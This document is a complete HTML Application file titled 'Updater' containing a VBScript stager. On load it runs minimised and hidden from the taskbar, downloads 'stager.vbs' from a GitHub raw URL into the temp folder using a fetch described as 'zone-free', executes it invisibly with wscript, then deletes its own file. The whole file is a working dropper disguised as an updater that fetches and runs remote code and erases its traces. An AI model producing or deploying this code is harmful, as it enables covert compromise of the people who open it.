<!DOCTYPE html>
<html>
<head>
  <hta:application
    id="Updater"
    applicationname="Updater"
    singleinstance="yes"
    windowstate="minimize"
    showintaskbar="no"
  />
  <title>Updater</title>
  <script language="VBScript">
    Sub Window_OnLoad()
      Dim sh, fso, tempVbs, htaPath
      Dim http, ts, url

      Set sh      = CreateObject("WScript.Shell")
      Set fso     = CreateObject("Scripting.FileSystemObject")
      tempVbs     = sh.ExpandEnvironmentStrings("%TEMP%") & "\stager.vbs"
      url         = "https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/stager.vbs"

      ' Use WinHttpRequest for a zone‚Äêfree fetch:
      On Error Resume Next
      Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
      If Err.Number <> 0 Then
        MsgBox "WinHttpRequest unavailable: " & Err.Description, vbCritical
        Exit Sub
      End If
      On Error GoTo 0

      http.Open "GET", url, False
      http.Send

      If http.Status = 200 Then
        Set ts = fso.CreateTextFile(tempVbs, True, False)
        ts.Write http.ResponseText
        ts.Close

        sh.Run "wscript.exe """ & tempVbs & """", 0, False
      Else
        MsgBox "Download failed: HTTP " & http.Status, vbExclamation
      End If

      htaPath = document.location.pathname
      If fso.FileExists(htaPath) Then fso.DeleteFile htaPath, True
      self.close
    End Sub
  </script>
</head>
<body>
</body>
</html>
